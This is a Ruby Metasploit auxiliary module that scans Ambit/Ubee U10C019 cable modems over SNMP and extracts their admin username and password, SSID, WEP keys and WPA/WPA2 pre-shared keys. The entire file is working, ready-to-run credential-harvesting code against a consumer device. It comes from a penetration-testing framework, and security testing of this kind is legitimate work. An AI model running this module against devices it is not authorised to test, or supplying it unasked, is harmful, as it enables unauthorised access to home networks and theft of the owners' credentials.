#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Ambit/Ubee U10C019 Cable Modem Wifi Enumeration',
      'Description' => "This module will extract wep keys and WPA preshared keys",
      'Author'      => ['PercentX deral_heiland[at]rapid7.com'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0') =~ /ambit/
           print_good("#{ip}")
           # System Admin username and Password
        username = snmp.get_value('1.3.6.1.4.1.4684.2.17.1.2.1.1.97.100.109.105.110')
        print_good("Username: #{username}")
        password = snmp.get_value('1.3.6.1.4.1.4684.2.17.1.2.1.2.97.100.109.105.110')
        print_good("Password: #{password}")

        wifistatus = snmp.get_value('1.3.6.1.4.1.4684.2.14.1.1.0')
        if wifistatus == "1"
          ssid = snmp.get_value('1.3.6.1.4.1.4684.2.14.1.2.0')
          print_line("WIFi is enabled")
          print_good("SSID: #{ssid}")

          wifiversion = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.6.0')
            if wifiversion == "0"
              print_line("Open Access Wifi is Enabled")

            #Wep enabled
            elsif wifiversion == "1"
            print_line("Device is configured for WEP")
              wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.1')
              print_good("WEP KEY1: #{wepkey1}")
              wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.2')
              print_good("WEP KEY2: #{wepkey2}")
              wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.3')
              print_good("WEP KEY3: #{wepkey3}")
              wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.4')
              print_good("WEP KEY4: #{wepkey4}")
              actkey = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.3.0')
              print_good("Active Wep key is Key#{actkey}")

            #WPA enabled
            elsif wifiversion == "2"
              print_line("Device is configured for WPA ")
              wpapsk = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.7.0')
              print_good("WPA PSK: #{wpapsk}")

            #WPA2 enabled
            elsif wifiversion == "3"
              print_line("Device is configured for WPA2")
              wpapsk2 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.7.0')
              print_good("WPA2 PSK: #{wpapsk2}")

            #WPA Enterprise enabled
            elsif wifiversion == "4"
              print_line("Device is configured for WPA enterprise")

            #WPA2 Enterprise enabled
            elsif wifiversion == "5"
              print_line("Device is configured for WPA2 enterprise")

            #WEP 802.1x enabled
            elsif wifiversion == "6"
              print_line("Device is configured for WEP 802.1X")

            else
              print_line("FAILED")
            end
      else
        print_line("WIFI is not enabled")
      end
    end

     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end
